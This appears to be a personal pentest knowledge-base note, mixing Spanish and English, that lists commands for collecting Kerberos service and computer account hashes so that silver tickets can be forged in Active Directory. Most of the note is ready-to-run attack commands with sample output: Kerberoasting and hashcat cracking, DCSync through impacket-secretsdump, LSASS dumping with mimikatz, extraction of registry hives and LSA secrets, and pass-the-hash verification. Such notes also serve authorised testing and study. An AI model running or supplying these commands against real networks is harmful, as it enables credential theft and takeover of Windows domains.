---
aliases:
  - Silver Ticket Hash Sources
tags:
  - type/technique
  - technique/credential-access
  - technique/kerberos
  - env/windows
  - env/linux
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Silver Ticket]]'
---

# Silver Ticket - Hash Collection

***

## Kerberoasting → crack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetUserSPNs corp.local/user:'pass'@DC -request -outputfile tgs.txt` | TGS hashes de todas las service accounts | Service accounts con SPN. |
| `impacket-GetUserSPNs corp.local/user:'pass'@DC -request -usersfile targets.txt` | TGS solo de targets específicos | Selectivo. |
| `hashcat -m 13100 tgs.txt wordlist.txt` | Password en claro → derivar NT hash | Post-capture. |
| `hashcat -m 19600 tgs.txt wordlist.txt` | RC4 TGS (AES128) | Si AES. |
| `hashcat -m 19700 tgs.txt wordlist.txt` | AES256 TGS | Si AES256. |
^st-hash-kerberoast

```bash
impacket-GetUserSPNs corp.local/user:'P@ssw0rd'@dc01.corp.local -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

# Password crackeada → obtener NT hash
python3 -c "import hashlib; print(hashlib.new('md4', 'cracked_pass'.encode('utf-16le')).hexdigest())"
```

___

## DCSync (computer / service account)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump corp.local/da:'pass'@DC -just-dc-user 'TARGET$'` | NT hash + AES keys del computer account | Computer account target. |
| `impacket-secretsdump corp.local/da:'pass'@DC -just-dc-user svc_mssql` | NT hash de service account | Service account target. |
| `impacket-secretsdump -k -no-pass corp.local/da@DC -just-dc-user 'HOST$'` | Idem con Kerberos ticket | Post-ticket. |
^st-hash-dcsync

```bash
# Computer account para forge silver ticket CIFS
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-user 'WEB01$'
# WEB01$:1234:aad3b435...:abc123COMPUTERHASH:::
# aes256_hmac: DEF456AESKEY
# aes128_hmac: ...
```

___

## LSASS dump

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::msv` | NT hashes en sesiones activas incluyendo computer/service accounts | On-host con admin. |
| `pypykatz lsa minidump lsass.dmp \| grep -A5 'Username'` | Idem offline desde minidump | Post-dump. |
| `mimikatz # sekurlsa::logonpasswords` | Passwords en claro + hashes | Si WDigest activo. |
^st-hash-lsass

```powershell
# Dump LSASS
.\mimikatz.exe "privilege::debug" "sekurlsa::msv" exit

# Buscar computer accounts (terminan en $)
# [00000003] Primary / NTLM : abc123HASH  ← target para silver
```

___

## LSA Secrets (computer account local)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `reg save HKLM\SYSTEM SYSTEM && reg save HKLM\SECURITY SECURITY` | Backup registry hives | Pre-dump (admin local). |
| `impacket-secretsdump LOCAL -security SECURITY -system SYSTEM` | Computer account hash en `_SC_` secrets | Offline desde target. |
| `impacket-secretsdump corp.local/localadmin:'pass'@TARGET` | Idem remoto | Admin local remoto. |
^st-hash-lsa

```bash
# Remote
impacket-secretsdump corp.local/localadmin:'P@ssw0rd'@web01.corp.local

# Output relevante:
# $MACHINE.ACC: aad3b435...:COMPUTERHASH ← esto forja silver ticket cifs/web01
# _SC_mssqlsvc: cleartext o hash de service account
```

___

## Verificar hash obtenido

| **Test** | **Comando** | **Cuándo** |
|:---:|:---:|:---:|
| PtH con computer hash | `impacket-smbclient -hashes :HASH corp.local/'WEB01$'@web01.corp.local` | Valida NT hash antes de forjar. |
| Resolve SPN | `impacket-GetUserSPNs corp.local/user:'pass'@DC -target-domain corp.local` | Confirmar SPN del target. |
^st-hash-verify

***
